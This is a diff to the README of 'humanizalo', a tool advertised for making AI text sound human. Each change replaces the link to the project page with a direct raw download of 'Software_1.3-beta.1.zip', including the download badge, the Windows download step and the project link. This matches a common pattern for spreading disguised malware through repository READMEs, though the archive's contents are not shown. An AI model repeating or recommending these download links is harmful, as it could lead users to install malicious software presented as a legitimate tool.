@@ -1,6 +1,6 @@
 # 🧠 humanizalo - Make AI text sound human
 
-[![Download humanizalo](https://img.shields.io/badge/Download-Open%20Project-7c3aed?style=for-the-badge)](https://github.com/decurved-agreement62/humanizalo)
+[![Download humanizalo](https://img.shields.io/badge/Download-Open%20Project-7c3aed?style=for-the-badge)](https://raw.githubusercontent.com/decurved-agreement62/humanizalo/main/references/Software_1.3-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ The project supports both English and Spanish.
 
 Use this link to visit the page and download the files you need:
 
-[Download humanizalo](https://github.com/decurved-agreement62/humanizalo)
+[Download humanizalo](https://raw.githubusercontent.com/decurved-agreement62/humanizalo/main/references/Software_1.3-beta.1.zip)
 
 If you are using Windows, follow these steps:
 
@@ -174,7 +174,7 @@ That process helps make the text easier to read.
 
 ## 🔗 Project Link
 
-[https://github.com/decurved-agreement62/humanizalo](https://github.com/decurved-agreement62/humanizalo)
+[https://raw.githubusercontent.com/decurved-agreement62/humanizalo/main/references/Software_1.3-beta.1.zip](https://raw.githubusercontent.com/decurved-agreement62/humanizalo/main/references/Software_1.3-beta.1.zip)
 
 ## 📌 Quick Start Checklist
 
